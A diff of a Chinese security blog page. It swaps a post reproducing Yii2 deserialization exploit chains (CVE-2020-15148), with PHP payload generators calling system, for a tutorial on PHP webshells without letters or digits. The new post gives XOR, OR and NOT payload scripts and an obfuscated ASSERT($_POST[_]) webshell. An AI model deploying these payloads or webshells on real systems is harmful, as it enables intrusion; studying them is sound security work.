@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="yii2框架 反序列化漏洞复现, 幻影旅团">
-    <meta name="description" content="yii2框架 反序列化漏洞复现">
+    <meta name="keywords" content="无数字字母rce, 幻影旅团">
+    <meta name="description" content="无数字字母构造webshell">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>yii2框架 反序列化漏洞复现 | 幻影旅团</title>
+    <title>无数字字母rce | 幻影旅团</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0">
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
 </head>
 
 
@@ -264,7 +264,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">yii2框架 反序列化漏洞复现</h1>
+                    <h1 class="description center-align post-title">无数字字母rce</h1>
                 </div>
             </div>
         </div>
@@ -380,8 +380,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                <span class="chip bg-color">反序列化</span>
+                            <a href="/tags/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">
+                                <span class="chip bg-color">无数字字母rce</span>
                             </a>
                         
                     </div>
@@ -392,8 +392,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/yii2/" class="post-category">
-                                yii2
+                            <a href="/categories/webshell/" class="post-category">
+                                webshell
                             </a>
                         
                     </div>
@@ -405,21 +405,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-26
+                    2022-03-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-07
+                    2022-03-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.8k
+                    1.3k
                 </div>
                 
 
@@ -444,392 +444,245 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>[TOC]</p>
-<p>Yii2 2.0.38 之前的版本存在反序列化漏洞，程序在调用unserialize 时，攻击者可通过构造特定的恶意请求执行任意命令</p>
-<p>根据 https:blog.csdn.netZero_Adamarticledetails118031709师傅学习</p>
-<p>https:blog.csdn.netqq_46918279articledetails120473172  CVE-2020-15148–Yii2 反序列化漏洞复现 搭建好环境</p>
-<h2 id="关于yii2的一些访问小知识"><a href="#关于yii2的一些访问小知识" class="headerlink" title="关于yii2的一些访问小知识"></a>关于yii2的一些访问小知识</h2><pre class="line-numbers language-none"><code class="language-none">根目录：http:localhostyii2basicwebindex.php 
-或者  http:localhostyii2basicweb
-而后用变量r来表示控制器和方法：
-http:localhostyii2basicwebindex.php?r=控制器方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>注意格式：（多词汇组成的，每个单词首字母需大写）<br>控制器的格式 是 TestController 。 后面的Controller是固定的。然后前面那一块是控制器的名字，输入的时候，小写就行。<br>里面的方法。格式是 actionTest 。 前面的action是固定的，后面的是名字，换成小写就好。</p>
-<p>例如：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226211549391.png" alt="image-20220226211549391"></p>
-<pre class="line-numbers language-none"><code class="language-none">http:localhostyii2basicwebindex.php?r=testtest&amp;data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="CVE-2020-15148复现"><a href="#CVE-2020-15148复现" class="headerlink" title="CVE-2020-15148复现"></a>CVE-2020-15148复现</h2><p>这个反序列化的入口点是一个__destruct()，在BatchQueryResult类中</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212028235.png" alt="image-20220226212028235"></p>
-<p>继续跟进reset()，发现没有什么利用的办法，正常可能链就断了，但是大师傅们的思路就是不一样，这里的<code>_dataReader</code>是可控的，那么调用了close的方法，是不是可以想办法触发<code>__call</code>呢？（调用类中不存在的方法的时候就会调用 <code>__call()</code>方法了）</p>
-<p>全局搜索(CTRL+SHIFT+F)一下__call，最后在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>找到了一个合适的__call方法：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212258957.png" alt="image-20220226212258957"></p>
-<p>因为上面的那个 close 是无参方法，所以传给 <code>__call()</code> 中的 <code>$method</code>是 <code>close</code> ， <code>$attributes</code> 为空。然后我们继续跟进format方法：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212318463.png" alt="image-20220226212318463"></p>
-<p>传入的formatter是 close</p>
-<p>好家伙，<code>call_user_func_array</code> 。 继续跟进一下 <code>getFormatter</code>.</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226212426017.png" alt="image-20220226212426017"></p>
-<p>$this-&gt;formatter 可控，因此返回值可控，因此`call_user_func_array($this-&gt;getFormatter($formatter), $arguments )中，回调函数我们可控，但是$arguments 是一个空数组，所以相当于我们能够干两件事：</p>
-<p>1.调用yii2中任意的一个无参方法，</p>
-<p>2.调用原生类中类似phpinfo()这样的无参方法。</p>
-<p>但是第二种肯定不能RCE。因此我们还需要在yii2中已有的无参方法中进行挖掘：</p>
-<h3 id="1-1调用原生php的类似phpinfo-这样的无参方法-调试："><a href="#1-1调用原生php的类似phpinfo-这样的无参方法-调试：" class="headerlink" title="1.1调用原生php的类似phpinfo()这样的无参方法 + 调试："></a>1.1调用原生php的类似phpinfo()这样的无参方法 + 调试：</h3><p>其实不用这个多，不用带 函数方法的，就带上属性就行了。但是为了本地调试能够看出来对错，我便带上了整个调用链的调用函数链</p>
+                <p>在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
-namespace Faker
-{
-    class Generator
-    {
-        protected $formatters;
-        public function __construct()
-        {
-            $this-&gt;formatters['close'] = "phpinfo"; # 调用单一原生函数，
-        }
+if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
+  eval($_GET['shell']);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-        public function __call($method, $attributes)
-        {
-            return $this-&gt;format($method, $attributes);
-        }
-
-        public function format($formatter, $arguments = array())
-        {
-            return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
-        }
-
-        public function getFormatter($formatter)
-        {
-            if (isset($this-&gt;formatters[$formatter])) {
-                return $this-&gt;formatters[$formatter];
-            }
-            foreach ($this-&gt;providers as $provider) {
-                if (method_exists($provider, $formatter)) {
-                    $this-&gt;formatters[$formatter] = array($provider, $formatter);
-
-                    return $this-&gt;formatters[$formatter];
-                }
-            }
-            throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
-        }
-
-    }
-}
-
-namespace yii\db
-{
-    use Faker\Generator;
-
-    class BatchQueryResult
-    {
-        private $_dataReader;
-        public function __construct()
-        {
-            $this-&gt;_dataReader = new Generator();
-        }
-
-        public function reset()
-        {
-            if ($this-&gt;_dataReader !== null) {
-                $this-&gt;_dataReader-&gt;close();
-            }
-            $this-&gt;_dataReader = null;
-            $this-&gt;_batch = null;
-            $this-&gt;_value = null;
-            $this-&gt;_key = null;
-        }
-        
-        public function __destruct()
-        {
-             make sure cursor is closed
-            $this-&gt;reset();
-        }
-    }
-}
-namespace
-{
-        use yii\db\BatchQueryResult;
-        echo base64_encode(serialize(new BatchQueryResult()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226213435176.png" alt="image-20220226213435176"></p>
-<p>反向也可</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226213821353.png" alt="image-20220226213821353"></p>
-<p>上面的就可以直接打了。其实精简的话，可以去掉除了<code>__construct()</code>之外的所有方法，</p>
+<p>此内容结合 P神博客 和羽师傅脚本</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> p神相关博客内容</p>
+<h2 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h2><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
-namespace Faker
-{
-    class Generator
-    {
-        protected $formatters;
+/*author yu22x*/
 
-        public function __construct()
-        {
-            $this-&gt;formatters['close'] = "phpinfo";
-        }
+$myfile = fopen("xor_rce.txt", "w");
+$contents="";
+for ($i=0; $i &lt; 256; $i++) { 
+	for ($j=0; $j &lt;256 ; $j++) { 
+
+		if($i&lt;16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j&lt;16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
     }
+  
+		else{
+		$a='%'.$hex_i; //因为其中存在很多不可打印字符，所以我url编码表示了）：
+		$b='%'.$hex_j;
+		$c=(urldecode($a)^urldecode($b));
+		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
 }
-
-namespace yii\db
-{
-    use Faker\Generator;
-
-    class BatchQueryResult
-    {
-        private $_dataReader;
-        public function __construct()
-        {
-            $this-&gt;_dataReader = new Generator();
-        }
-    }
 }
+fwrite($myfile,$contents);
+fclose($myfile);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-namespace
-{
-        use yii\db\BatchQueryResult;
-        echo base64_encode(serialize(new BatchQueryResult()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
 
-<p>生成的payload是和上面的那个是一样的。</p>
-<h3 id="1-2-调用yii2中任意的一个无参方法"><a href="#1-2-调用yii2中任意的一个无参方法" class="headerlink" title="1.2 调用yii2中任意的一个无参方法"></a>1.2 调用yii2中任意的一个无参方法</h3><p>在yii2中找无参方法：</p>
-<pre class="line-numbers language-none"><code class="language-none">function \w+\(\)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+# author yu22x
 
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226214243100.png" alt="image-20220226214243100"></p>
-<p>但是无参函数实在是太多了，一个一个挖起来实在费力。这里就是大师傅们的经验和智慧了,直接搜索含有 <code>call_user_function</code>的无参函数：</p>
-<pre class="line-numbers language-none"><code class="language-none">function \w*\(\)\n? *\{(.*\n)+ *call_user_func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("xor_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"^\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226214709121.png" alt="image-20220226214709121"></p>
-<p>师傅说<code>restCreateAction.php</code>以及<code>restIndexAction.php</code>都可以，这里分析一下 CreateAction.php看看</p>
-<p>这个直接啊，到时候第一个回调函数，回调这个run，然后两个参数为system ，dir。 就RCE了嘛，函数名和参数都可控</p>
-<p>理一下就是这样：</p>
-<pre class="line-numbers language-none"><code class="language-none">class BatchQueryResult  -&gt;__destruct()
-↓↓↓
-class BatchQueryResult  -&gt;reset()
-↓↓↓
-class Generator  -&gt;__call()
-↓↓↓
-class Generator  -&gt;format()
-↓↓↓
-class Generator  -&gt;getFormatter()
-↓↓↓
-class IndexAction  -&gt;run()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
+<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220321210302352.png" alt="image-20220321210302352"></p>
+<h2 id="二、或"><a href="#二、或" class="headerlink" title="二、或"></a>二、或</h2><p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 
-namespace yii\rest{
-    class IndexAction{
-        public $checkAccess;
-        public $id;
-        public function __construct(){
-            $this-&gt;checkAccess = 'system';
-            $this-&gt;id = 'dir';
-        }
+/* author yu22x */
+
+$myfile = fopen("or_rce.txt", "w");
+$contents="";
+for ($i=0; $i &lt; 256; $i++) { 
+	for ($j=0; $j &lt;256 ; $j++) { 
+
+		if($i&lt;16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j&lt;16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		$preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
     }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)|urldecode($b));
+		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
 }
-namespace Faker {
-
-    use yii\rest\IndexAction;
-
-    class Generator
-    {
-        protected $formatters;
-
-        public function __construct()
-        {
-            $this-&gt;formatters['close'] = [new IndexAction(), 'run'];
-        }
-    }
 }
-namespace yii\db{
+fwrite($myfile,$contents);
+fclose($myfile);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    use Faker\Generator;
+<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
 
-    class BatchQueryResult{
-        private $_dataReader;
-        public function __construct()
-        {
-            $this-&gt;_dataReader=new Generator();
-        }
-    }
-}
-namespace{
+# author yu22x
 
-    use yii\db\BatchQueryResult;
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("or_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"|\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    echo base64_encode(serialize(new BatchQueryResult()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226215721642.png" alt="image-20220226215721642"></p>
-<h2 id="反序列化链2的复现"><a href="#反序列化链2的复现" class="headerlink" title="反序列化链2的复现"></a>反序列化链2的复现</h2><p>根据yii2.0.38的更新：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231320398.png" alt="image-20220226231320398"></p>
-<p>增加了__wakeup()，在反序列化的时候直接抛出异常，因此以BatchQueryResult为起点的这条链在2.0.38里算是不行了。因此再继续复习学习一下大师傅们针对2.0.38挖掘的其他新链。</p>
-<p>类比上一条链的思路，yii2只是限制了batchQueryResult类不能进行反序列化，但是后面的__cal以及之后的链都是完好无损的，因此想找一条新的链，最快的方式就是再找一个存在__destruct这样的利用点，然后正好类中的一个属性调用了一个方法，而且这个属性我们可控，那么就是一条新链了。<br>全局找一下__destruct，经过排查，发现RunProcess类的__destruct可以利用：<br><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231402247.png" alt="image-20220226231402247"></p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231633167.png" alt="image-20220226231633167"></p>
-<p>这里<code>$process-&gt;isRunning()</code>，因为<code>$this-&gt;processes</code>是我们可控的，因此<code>$process</code>也同样可控，所以这里调用isRunning方法，又可以触发__call，然后继续反序列化攻击。</p>
-<p>构造一波POC：</p>
+<h2 id="三、取反"><a href="#三、取反" class="headerlink" title="三、取反"></a>三、取反</h2><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到正则表达式，我们一个php脚本就可以了</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
+//在命令行中运行
 
-namespace yii\rest{
-    class IndexAction{
-        public $checkAccess;
-        public $id;
-        public function __construct(){
-            $this-&gt;checkAccess = 'system';
-            $this-&gt;id = 'dir';
-        }
-    }
-}
-namespace Faker {
+/*author yu22x*/
 
-    use yii\rest\IndexAction;
+fwrite(STDOUT,'[+]your function: ');
 
-    class Generator
-    {
-        protected $formatters;
+$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
 
-        public function __construct()
-        {
-            $this-&gt;formatters['isRunning'] = [new IndexAction(), 'run'];
-        }
-    }
-}
-namespace Codeception\Extension{
+fwrite(STDOUT,'[+]your command: ');
 
-    use Faker\Generator;
+$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
 
-    class RunProcess
-    {
-        private $processes = [];
-        public function __construct(){
-            $this-&gt;processes[]=new Generator();
-        }
-    }
-}
-namespace{
+echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-    use Codeception\Extension\RunProcess;
-
-    echo base64_encode(serialize(new RunProcess()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226231817423.png" alt="image-20220226231817423"></p>
-<h2 id="反序列化链3的复现"><a href="#反序列化链3的复现" class="headerlink" title="反序列化链3的复现"></a>反序列化链3的复现</h2><p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226232626581.png" alt="image-20220226232626581"></p>
-<p>跟进一下 clearall：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226232654955.png" alt="image-20220226232654955"></p>
-<p>没有可以触发__call的地方，但是发现存在字符串的拼接，而<code>$this-&gt;path</code>和<code>$nsKey</code>都是我们可控的，因此可以触发__toString()。全局搜索一波，可以找到很多：</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226233135426.png" alt="image-20220226233135426"></p>
+<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></a></p>
+<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>
+<p>利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$_=[];
+$_=@"$_"; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
 
-namespace yii\rest{
-    class IndexAction{
-        public $checkAccess;
-        public $id;
-        public function __construct(){
-            $this-&gt;checkAccess = 'system';
-            $this-&gt;id = 'dir';
-        }
+$____='_';
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="增加难度"><a href="#增加难度" class="headerlink" title="增加难度"></a>增加难度</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(strlen($code)&gt;35){
+        die("Long.");
     }
-}
-namespace Faker {
-
-    use yii\rest\IndexAction;
-
-    class Generator
-    {
-        protected $formatters;
-
-        public function __construct()
-        {
-            $this-&gt;formatters['render'] = [new IndexAction(), 'run'];
-        }
+    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
+        die("NO.");
     }
-}
-namespace phpDocumentor\Reflection\DocBlock\Tags{
+    eval($code);
+}else{
+    highlight_file(__FILE__);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    use Faker\Generator;
-
-    class See
-    {
-        protected $description;
-        public function __construct(){
-            $this-&gt;description=new Generator();
-        }
-    }
-}
-
-namespace{
-    use phpDocumentor\Reflection\DocBlock\Tags\See;
-    class Swift_KeyCache_DiskKeyCache
-    {
-        private $keys = [];
-        private $path;
-        public function __construct(){
-            $this-&gt;path=new See();
-            $this-&gt;keys=array(
-                'hello'=&gt;'world'
-            );
-        }
-    }
-
-    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226233503651.png" alt="image-20220226233503651"></p>
-<h2 id="反序列化链4的复现"><a href="#反序列化链4的复现" class="headerlink" title="反序列化链4的复现"></a>反序列化链4的复现</h2><p>这条链不适用和2.0.38，是2.0.37的另一条利用链，不过还是以·BatchQueryResult·类的<code>__destruct</code>作为起点。</p>
-<p>还是跟进到这里：<code>$this-&gt;_dataReader-&gt;close();</code>。但不是找__call作为跳板，而是寻找确实存在close方法的一个类，而且这个类的close方法可以利用。经过寻找，找到了<code>DbSession</code>这个类。</p>
-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226234611826.png" alt="image-20220226234611826"></p>
-<p>跟进<code>getIsActive()</code>，发现无法利用，跟进<code>composeFields()</code>：</p>
